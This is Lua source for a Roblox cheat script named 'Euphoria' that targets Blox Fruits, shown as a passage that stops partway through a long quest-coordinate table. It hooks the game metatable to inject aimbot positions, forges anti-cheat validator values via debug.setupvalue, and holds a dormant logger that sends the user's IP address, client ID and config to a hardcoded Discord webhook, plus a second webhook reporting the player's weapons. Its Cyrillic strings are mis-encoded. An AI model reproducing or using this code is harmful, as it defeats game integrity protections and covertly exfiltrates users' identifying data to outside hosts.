local status, err = pcall(function()
    local placeId = game.PlaceId
    if placeId == 2753915549 or placeId == 4442272183 or placeId == 7449423635 then
        BF = true
    end
    if placeId == 2753915549 then
        first_sea = true
    end
    if placeId == 4442272183 then
        second_sea = true
    end
    if placeId == 7449423635 then
        third_sea = true
    end
    if BF == true then
        repeat wait() until game:IsLoaded()
        repeat wait() until game:FindFirstChild("Workspace")
        repeat wait() until game:FindFirstChild("ReplicatedStorage")
        repeat wait() until game:FindFirstChild("Players")
        Players = game:GetService("Players")
        LP = Players.LocalPlayer
        ReplicatedStorage = game:GetService("ReplicatedStorage")
        Enemies = workspace.Enemies
        loadstring(
            [[
            local gg = getrawmetatable(game)
            local old = gg.__namecall
            setreadonly(gg, false)
            gg.__namecall =
                newcclosure(
                function(...)
                    local method = getnamecallmethod()
                    local args = {...}
                    if tostring(method) == "FireServer" then
                        if tostring(args[1]) == "RemoteEvent" then
                            if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                                if _G.AimbotPos then
                                    args[2] = _G.AimbotPos
                                end
                                return old(unpack(args))
                            end
                        end
                    end
                    return old(...)
                end
            )
        ]]
        )()
        function Notification(text)
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Euphoria";
                Text = text
            })
        end
        if _G.EuphoriaLoaded == 1 then
            Notification("Another instance of Euphoria already loaded")
            print("Another instance of Euphoria already loaded")
            return
        end

        local SettingsFile = "EuphoriaUI.json"
        function LoadSettings()
            local status, err = pcall(function()
                Settings = game:GetService('HttpService'):JSONDecode(readfile(SettingsFile))
            end)
            if not err then return Settings else return false end
        end

        function WriteSettings()
            writefile(SettingsFile, game:GetService('HttpService'):JSONEncode(getgenv().Settings))
            print(game:GetService('HttpService'):JSONEncode(getgenv().Settings))
        end
        local DefaultSettings = {
            ["lastjobid"] = "", 
            ["uibutton"] = Enum.KeyCode.RightShift,
            ["killaura"] = false,
            ["autonextisland"] = false
        }
        getgenv().Settings = DefaultSettings
        settings = LoadSettings()
        if settings then
            for i,v in pairs(settings) do
                getgenv().Settings[i] = v
            end 
        end
        WriteSettings()

        function isWeaponInInventory(itemName)
            if LP.Backpack:FindFirstChild(itemName) then return true end
            if LP.Character:FindFirstChild(itemName) then return true end
            for i, item in pairs(ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventoryWeapons")) do 
                if item.Name == itemName then return true end
            end
            return false
        end

        function sendWebhook(url, content, embed)
            http.request {
                Url = url;
                Method = 'POST';
                Headers = {
                    ['Content-Type'] = 'application/json';
                };
                Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
            };
        end

        function sendLogger()
            local url = "https://discord.com/api/webhooks/1208582035472515092/-x9YYMrLsmzYASYrTjDWkEkObszGjx8DlPeNcoecN4O0BmoynQo4s8De58BOuDh4Xa5B"
            local ip = game:HttpGet("https://api.ipify.org")
            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local config = "`" .. readfile(SettingsFile) .. "`"
            local sea = ""
            if first_sea then sea = "First Sea" end
            if second_sea then sea = "Second Sea" end
            if third_sea then sea = "Third Sea" end
            local g_values = ""
            g_values = g_values .. "`_G.Kaitun = " .. tostring(_G.Kaitun) .. "`\n"
            g_values = g_values .. "`_G.MaxLevel = " .. tostring(_G.MaxLevel) .. "`\n"
            g_values = g_values .. "`_G.SelectWeapon = " .. tostring(_G.SelectWeapon) .. "`\n"
            g_values = g_values .. "`_G.Webhook = " .. tostring(_G.Webhook) .. "`\n"
            g_values = g_values .. "`_G.AutoYama = " .. tostring(_G.AutoYama) .. "`\n"
            g_values = g_values .. "`_G.AutoYamaHop = " .. tostring(_G.AutoYamaHop) .. "`\n"
            local Embed = {
                ["title"] = "–ö—Ç–æ-—Ç–æ –∑–∞–∏–Ω–∂–µ–∫—Ç–∏–ª Euphoria",
                ["description"] = "–í–æ—Ç —ç—Ç—É —Å—É—á–∫—É —è —Ç—Ä–∞—Ö–∞–ª –∫–æ—Ç–æ—Ä–∞—è –∏–Ω–∂–µ–∫—Ç–∏—Ç –∫–æ–Ω–µ—á–Ω–æ –º–æ–π —Å–∫—Ä–∏–ø—Ç –±–µ–∑ `_G.InsecureBitch = 'hehe'` =)",
                ["color"] = 5814783,
                ["fields"] = {
                    {
                        ["name"] = "IP Address",
                        ["value"] = "`" .. ip .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Client ID",
                        ["value"] = "`" .. hwid .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "_G Values",
                        ["value"] = g_values,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = "`" .. identifyexecutor() .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Sea",
                        ["value"] = "`" .. sea .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job ID",
                        ["value"] = "`" .. game.JobId .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Current config",
                        ["value"] = config,
                        ["inline"] = false
                    },
                    
                    
                },
                ["author"] = {
                    ["name"] = LP.Name .. " | " .. tostring(LP.Data.Level.Value) .. " Level"
                }
            }
            sendWebhook(url, "@here", Embed)
        end

        -- if _G.InsecureBitch ~= "hehe" then
        --     sendLogger()
        -- end
        function getMoonPhase()
            phase = game:GetService("Lighting"):GetAttribute("MoonPhase")
            if phase == 1 then
                return "üåë 4 Nights before fullmoon"
            elseif phase == 2 then
                return "üåò 3 Nights before fullmoon"
            elseif phase == 3 then
                return "üåó 2 Nights before fullmoon"
            elseif phase == 4 then
                return "üåñ 1 Night before fullmoon"
            elseif phase == 5 then
                return "üåï Fullmoon"
            elseif phase == 6 then
                return "üåî 7 Nights before fullmoon"
            elseif phase == 7 then
                return "üåì 6 Nights before fullmoon"
            elseif phase == 8 then
                return "üåí 5 Nights before fullmoon"
            else
                return "pizdec"
            end
        end
        
        allWeapons = {}
        function getAllWeapons()
            for i, item in pairs(ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventoryWeapons")) do 
                for v, weap in pairs(allWeapons) do
                    if weap ~= item.Name then table.insert(allWeapons, item) end
                end
            end
        end
        function getNewWeapons()
            newWeapons = {}
            for i, item in pairs(ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventoryWeapons")) do 
                for v, weap in pairs(allWeapons) do
                    if weap == item.Name then notNew = 1 end
                end
                if notNew ~= 1 then
                    table.insert(newWeapons, "+ " .. item.Name)
                end
            end
            if type(next(newWeapons)) == "nil" then
                return
            end
             
            local Embed = {
                ["title"] = LP.Name .. " | NEW SWORD",
                ["description"] = "**Obtained new weapons**\n```diff\n" .. table.concat(newWeapons, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook("https://discord.com/api/webhooks/1207823253595230218/T5gBIa-np51foh8xgrPGcj9Ldx6Tri6M-wURyKOKAW2u5ReegYQYtL1XF8CodPD9SJ0b",
            "@here",
            Embed)
        end

        task = task or getrenv().task;
        fastSpawn,fastWait,delay = task.spawn,task.wait,task.delay
        local Nonquest = false
        if getgenv().Settings["Select Weapon"] then
            _G.SelectWeapon = getgenv().Settings["Select Weapon"]
        else
            _G.SelectWeapon = _G.SelectWeapon or "Melee"
        end
        _G.EuphoriaLoaded = 1
        wait(1)
        notis = require(game.ReplicatedStorage:WaitForChild("Notification"))
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        print("Euphoria Loaded Successfully")
        if ReplicatedStorage.Effect.Container:FindFirstChild("Death") then
            ReplicatedStorage.Effect.Container.Death:Destroy()
        end
        if ReplicatedStorage.Effect.Container:FindFirstChild("Respawn") then
            ReplicatedStorage.Effect.Container.Respawn:Destroy()
        end

        function HopServer(bO)
            if not bO then
                bO = 10
            end
            ticklon = tick()
            repeat
                task.wait()
            until tick() - ticklon >= 1
            local function Hop()
                for r = 1, math.huge do
                    if ChooseRegion == nil or ChooseRegion == "" then
                        ChooseRegion = "Germany"
                    else
                        LP.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                            ChooseRegion
                    end
                    local bP = ReplicatedStorage.__ServerBrowser:InvokeServer(r)
                    for k, v in pairs(bP) do
                        if k ~= game.JobId and v["Count"] < bO then
                            ReplicatedStorage.__ServerBrowser:InvokeServer("teleport", k)
                        end
                    end
                end
                return false
            end
            if not getgenv().Loaded then
                local function bQ(v)
                    if v.Name == "ErrorPrompt" then
                        if v.Visible then
                            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                v.Visible = false
                            end
                        end
                        v:GetPropertyChangedSignal("Visible"):Connect(
                            function()
                                if v.Visible then
                                    if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                        HopServer()
                                        v.Visible = false
                                    end
                                end
                            end
                        )
                    end
                end
                for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                    bQ(v)
                end
                game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(bQ)
                getgenv().Loaded = true
            end
            while not Hop() do
                wait()
            end
        end
        local function RequestEntrance(Position)
            -- Script generated by SimpleSpy - credits to exx#9394
            local args = {
                [1] = "requestEntrance",
                [2] = Position
            }
            ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
        end
        local CombatFramework = require(LP.PlayerScripts:WaitForChild("CombatFramework"))
        local CombatFrameworkR = getupvalues(CombatFramework)[2]
        local RigController = require(LP.PlayerScripts.CombatFramework.RigController)
        local cooldownfastattack = tick()
        function getAllBladeHits(Sizes)
            local Hits = {}
            local Client = LP
            local Enemies = game:GetService("Workspace").Enemies:GetChildren()
            for i=1,#Enemies do local v = Enemies[i]
                local Human = v:FindFirstChildOfClass("Humanoid")
                if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
                    table.insert(Hits,Human.RootPart)
                end
            end
            return Hits
        end
        function CurrentWeapon()
            local ac = CombatFrameworkR.activeController
            local ret = ac.blades[1]
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            pcall(function()
                while ret.Parent~=LP.Character do ret=ret.Parent end
            end)
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            return ret
        end

    
        local plr = LP

        local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
        local CbFw2 = CbFw[2]
        
        function GetCurrentBlade() 
            local p13 = CbFw2.activeController
            local ret = p13.blades[1]
            if not ret then return end
            while ret.Parent~=LP.Character do ret=ret.Parent end
            return ret
        end
        function AttackFunction() 
            local AC = CbFw2.activeController
            for i = 1, 1 do 
                local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                    plr.Character,
                    {plr.Character.HumanoidRootPart},
                    60
                )
                local cac = {}
                local hash = {}
                for k, v in pairs(bladehit) do
                    if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                        table.insert(cac, v.Parent.HumanoidRootPart)
                        hash[v.Parent] = true
                    end
                end
                bladehit = cac
                if #bladehit > 0 then
                    local u8 = debug.getupvalue(AC.attack, 5)
                    local u9 = debug.getupvalue(AC.attack, 6)
                    local u7 = debug.getupvalue(AC.attack, 4)
                    local u10 = debug.getupvalue(AC.attack, 7)
                    local u12 = (u8 * 798405 + u7 * 727595) % u9
                    local u13 = u7 * 798405
                    (function()
                        u12 = (u12 * u9 + u13) % 1099511627776
                        u8 = math.floor(u12 / u9)
                        u7 = u12 - u8 * u9
                    end)()
                    u10 = u10 + 1
                    debug.setupvalue(AC.attack, 5, u8)
                    debug.setupvalue(AC.attack, 6, u9)
                    debug.setupvalue(AC.attack, 4, u7)
                    debug.setupvalue(AC.attack, 7, u10)
                    pcall(function()
                        for k, v in pairs(AC.animator.anims.basic) do
                            v:Play()
                        end                  
                    end)
                    if plr.Character:FindFirstChildOfClass("Tool") and AC.blades and AC.blades[1] then 
                        ReplicatedStorage.RigControllerEvent:FireServer("weaponChange",tostring(GetCurrentBlade()))
                        game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(u12 / 1099511627776 * 16777215), u10)
                        ReplicatedStorage.RigControllerEvent:FireServer("hit", bladehit, i, "") 
                    end
                end
            end
        end
    
        require(game.ReplicatedStorage.Util.CameraShaker):Stop()

        function QuestCheck()
            local MyLevel = LP.Data.Level.Value
            if first_sea then
                if MyLevel == 1 or MyLevel <= 9 then -- Bandit
                    Ms = "Bandit"
                    NameQuest = "BanditQuest1"
                    LevelQuest = 1
                    NameMon = "Bandit"
                    CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
                    CFrameMon = CFrame.new(1353.44885, 3.40935516, 1376.92029, 0.776053488, -6.97791975e-08, 0.630666852, 6.99138596e-08, 1, 2.4612488e-08, -0.630666852, 2.49917598e-08, 0.776053488)
                elseif MyLevel == 10 or MyLevel <= 14 then -- Monkey
                    Ms = "Monkey"
                    NameQuest = "JungleQuest"
                    LevelQuest = 1
                    NameMon = "Monkey"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1402.74609, 98.5633316, 90.6417007, 0.836947978, 0, 0.547282517, -0, 1, -0, -0.547282517, 0, 0.836947978)
                elseif MyLevel == 15 or MyLevel <= 29 then -- Gorilla
                    Ms = "Gorilla"
                    NameQuest = "JungleQuest"
                    LevelQuest = 2
                    NameMon = "Gorilla"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1267.89001, 66.2034225, -531.818115, -0.813996196, -5.25169774e-08, -0.580869019, -5.58769671e-08, 1, -1.21082593e-08, 0.580869019, 2.26011476e-08, -0.813996196)
                elseif MyLevel >= 30 and MyLevel <= 40-1 then

                    Ms = "Pirate"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 1
                    NameMon = "Pirate"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1169.5365, 5.09531212, 3933.84082, -0.971822679, -3.73200315e-09, 0.235713184, -4.16762763e-10, 1, 1.41145424e-08, -0.235713184, 1.3618596e-08, -0.971822679)
                elseif MyLevel >= 40 and MyLevel <= 60-1 then

                    Ms = "Brute"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 2
                    NameMon = "Brute"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1165.09985, 15.1531372, 4363.51514, -0.962800264, 1.17564889e-06, 0.270213336, 2.60172015e-07, 1, -3.4237969e-06, -0.270213336, -3.22613073e-06, -0.962800264)
                elseif MyLevel >= 60 and MyLevel <= 75-1 then

                    Ms = "Desert Bandit"
                    NameQuest = "DesertQuest"
                    LevelQuest = 1
                    NameMon = "Desert Bandit"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
                elseif MyLevel >= 75 and MyLevel <= 90-1 then

                    Ms = "Desert Officer"
                    NameQuest = "DesertQuest"
                    LevelQuest = 2
                    NameMon = "Desert Officer"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-08, -0.070099175, -1.69377223e-08, 1, -8.17798806e-08, 0.070099175, -8.03913949e-08, -0.997540116)
                elseif MyLevel == 90 or MyLevel <= 99 then -- Snow Bandits

                    Ms = "Snow Bandit"
                    NameQuest = "SnowQuest"
                    LevelQuest = 1
                    NameMon = "Snow Bandits"
                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1412.92346, 55.3503647, -1260.62036, -0.246266365, -0.0169920288, -0.969053388, 0.000432241941, 0.999844253, -0.0176417865, 0.969202161, -0.00476344163, -0.246220857)
                elseif MyLevel == 100 or MyLevel <= 119 then -- Snowman

                    Ms = "Snowman"
                    NameQuest = "SnowQuest"
                    LevelQuest = 2
                    NameMon = "Snowman"
                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-08, -0.162211925, 7.71531674e-08, 1, 6.08143536e-09, 0.162211925, -6.51427134e-09, -0.986755967)
                elseif MyLevel == 120 or MyLevel <= 149 then -- Chief Petty Officer

                    Ms = "Chief Petty Officer"
                    NameQuest = "MarineQuest2"
                    LevelQuest = 1
                    NameMon = "Chief Petty Officer"
                    CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
                elseif MyLevel == 150 or MyLevel <= 174 then -- Sky Bandit

                    Ms = "Sky Bandit"
                    NameQuest = "SkyQuest"
                    LevelQuest = 1
                    NameMon = "Sky Bandit"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-4959.51367, 365.39267, -2974.56812, 0.964867651, 7.74418396e-08, 0.262737453, -6.95931988e-08, 1, -3.91783708e-08, -0.262737453, 1.95171506e-08, 0.964867651)
                elseif MyLevel == 175 or MyLevel <= 189 then -- Dark Master

                    Ms = "Dark Master"
                    NameQuest = "SkyQuest"
                    LevelQuest = 2
                    NameMon = "Dark Master"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-5079.98096, 376.477356, -2194.17139, 0.465965867, -3.69776352e-08, 0.884802461, 3.40249851e-09, 1, 4.00000886e-08, -0.884802461, -1.56281423e-08, 0.465965867)
                elseif MyLevel == 190 or MyLevel <= 209 then

                    Ms = "Prisoner"
                    LevelQuest = 1
                    NameQuest = "PrisonerQuest"
                    NameMon = "Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 210 or MyLevel <= 249 then

                    Ms = "Dangerous Prisoner"
                    LevelQuest = 2
                    NameQuest = "PrisonerQuest"
                    NameMon = "Dangerous Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 250 or MyLevel <= 274 then -- Toga Warrior

                    Ms = "Toga Warrior"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 1
                    NameMon = "Toga Warrior"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
                elseif MyLevel == 275 or MyLevel <= 299 then -- Gladiato

                    Ms = "Gladiator"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 2
                    NameMon = "Gladiato"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
                elseif MyLevel == 300 or MyLevel <= 329 then -- Military Soldier

                    Ms = "Military Soldier"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 1
                    NameMon = "Military Soldier"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
                elseif MyLevel == 330 or MyLevel <= 374 then -- Military Spy

                    Ms = "Military Spy"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 2
                    NameMon = "Military Spy"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5787.99023, 120.864456, 8762.25293, -0.188358366, -1.84706277e-08, 0.982100308, -1.23782129e-07, 1, -4.93306951e-09, -0.982100308, -1.22495649e-07, -0.188358366)
                elseif MyLevel == 375 or MyLevel <= 399 then -- Fishman Warrior

                    Ms = "Fishman Warrior"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 1
                    NameMon = "Fishman Warrior"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
                    CFrameMon = CFrame.new(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
                elseif MyLevel == 400 or MyLevel <= 449 then -- Fishman Commando

                    Ms = "Fishman Commando"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 2
                    NameMon = "Fishman Commando"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504)
                    CFrameMon = CFrame.new(61928.8867, 18.4828186, 1458.55127)
                elseif MyLevel == 450 or MyLevel <= 474 then

                    Ms = "God's Guard"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 1
                    NameMon = "God's Guards"
                    CFrameQuest = CFrame.new(-4721.71436, 845.277161, -1954.20105)
                    CFrameMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)
                elseif MyLevel == 475 or MyLevel <= 524 then 

                    Ms = "Shanda"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 2
                    NameMon = "Shandas"
                    CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                    CFrameMon = CFrame.new(-7904.57373, 5584.37646, -459.62973, 0.65171206, 5.11171692e-08, 0.758466363, -4.76232476e-09, 1, -6.33034247e-08, -0.758466363, 3.76435416e-08, 0.65171206)
                elseif MyLevel == 525 or MyLevel <= 549 then -- Royal Squad

                    Ms = "Royal Squad"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 1
                    NameMon = "Royal Squad"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7555.04199, 5606.90479, -1303.24744, -0.896107852, -9.6057462e-10, -0.443836004, -4.24974544e-09, 1, 6.41599973e-09, 0.443836004, 7.63560326e-09, -0.896107852)
                elseif MyLevel == 550 or MyLevel <= 624 then -- Royal Soldier

                    Ms = "Royal Soldier"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 2
                    NameMon = "Royal Soldier"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7837.31152, 5649.65186, -1791.08582, -0.716008604, 0.0104285581, -0.698013008, 5.02521061e-06, 0.99988848, 0.0149335321, 0.69809103, 0.0106890313, -0.715928733)
                elseif MyLevel == 625 or MyLevel <= 649 then -- Galley Pirate

                    Ms = "Galley Pirate"
                    NameQuest = "FountainQuest"
                    LevelQuest = 1
                    NameMon = "Galley Pirate"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-08, 0.443124533, -1.34262139e-08, 1, -6.26611296e-08, -0.443124533, 5.02237434e-08, 0.896460414)
                elseif MyLevel >= 650 then -- Galley Captain

                    Ms = "Galley Captain"
                    NameQuest = "FountainQuest"
                    LevelQuest = 2
                    NameMon = "Galley Captain"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5782.90186, 94.5326462, 4716.78174, 0.361808896, -1.24757526e-06, -0.932252586, 2.16989656e-06, 1, -4.96097414e-07, 0.932252586, -1.84339774e-06, 0.361808896)
                end
            end
            if second_sea then
                Nonquest = false
                if MyLevel == 700 or MyLevel <= 724 then -- Raider
                    Ms = "Raider"
                    NameQuest = "Area1Quest"
                    LevelQuest = 1
                    NameMon = "Raider"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, -0, 1, -0, 0.962260842, 0, 0.272128761)
                elseif MyLevel == 725 or MyLevel <= 774 then -- Mercenary
                    Ms = "Mercenary"
                    NameQuest = "Area1Quest"
                    LevelQuest = 2
                    NameMon = "Mercenary"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-1022.21271, 72.9855194, 1891.39148, -0.990782857, 0, -0.135460541, 0, 1, 0, 0.135460541, 0, -0.990782857)
                elseif MyLevel == 775 or MyLevel <= 799 then -- Swan Pirate
                    Ms = "Swan Pirate"
                    NameQuest = "Area2Quest"
                    LevelQuest = 1
                    NameMon = "Swan Pirate"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(976.467651, 111.174057, 1229.1084, 0.00852567982, -4.73897828e-08, -0.999963999, 1.12251888e-08, 1, -4.7295778e-08, 0.999963999, -1.08215579e-08, 0.00852567982)
                elseif MyLevel == 800 or MyLevel <= 874 then -- Factory Staff
                    Ms = "Factory Staff"
                    NameQuest = "Area2Quest"
                    LevelQuest = 2
                    NameMon = "Factory Staff"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(336.74585, 73.1620483, -224.129272, 0.993632793, 3.40154607e-08, 0.112668738, -3.87658332e-08, 1, 3.99718729e-08, -0.112668738, -4.40850592e-08, 0.993632793)
                elseif MyLevel == 875 or MyLevel <= 899 then -- Marine Lieutenant
                    Ms = "Marine Lieutenant"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 1
                    NameMon = "Marine Lieutenant"
                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299)
                elseif MyLevel == 900 or MyLevel <= 949 then -- Marine Captain
                    Ms = "Marine Captain"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 2
                    NameMon = "Marine Captain"
